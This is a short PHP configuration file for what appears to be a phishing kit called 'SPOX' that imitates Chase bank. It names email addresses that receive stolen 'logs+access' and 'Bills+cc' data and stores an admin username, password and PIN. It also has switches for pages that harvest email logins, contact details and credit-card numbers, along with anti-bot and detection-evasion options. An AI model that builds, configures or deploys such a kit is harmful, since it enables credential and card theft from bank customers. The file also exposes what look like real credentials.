<?php


// SPAM INFO

$yourname = "SPOX";
$your_email = "omranmedo23@yahoo.com"; // logs+access
$your_email2 = "omranmedo23@yahoo.com"; // Bills+cc


//ADMIN LOGIN INFO

$username = "SPOX";
$password = "Aezakmi#9855";
$pin = "9855"; 
// Redirect

$redirect = "chase";


// ON / OFF 
$allow_country = "yes";
$spam_hotmail = "no";
$double_login = "no";
$double_access = "yes";
$spox_protection = "yes";
$redirection = "no";
$double_cc = "no";
$show_start_page = "yes"; 
$show_email_access = "yes"; 
$show_contact_information = "yes";
$show_credit_card = "yes";
$show_success_page = "yes";
$anti_bot = "yes";



// KEY PROTECTION
$api = "3c23ec5db070f21c3f5ed5cd77324914";





?>